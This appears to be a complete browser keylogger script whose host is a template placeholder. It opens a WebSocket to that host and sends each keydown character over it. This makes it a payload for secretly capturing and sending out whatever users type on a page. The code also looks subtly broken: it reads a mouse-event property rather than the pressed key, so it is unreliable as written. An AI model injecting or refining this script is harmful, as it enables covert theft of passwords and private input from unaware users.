(function() {
    let conn = new WebSocket("ws://{{.}}/ws");
    document.addEventListener("keydown", function(evt){
        s = String.fromCharCode(evt.button);
        conn.send(s);
    })
})();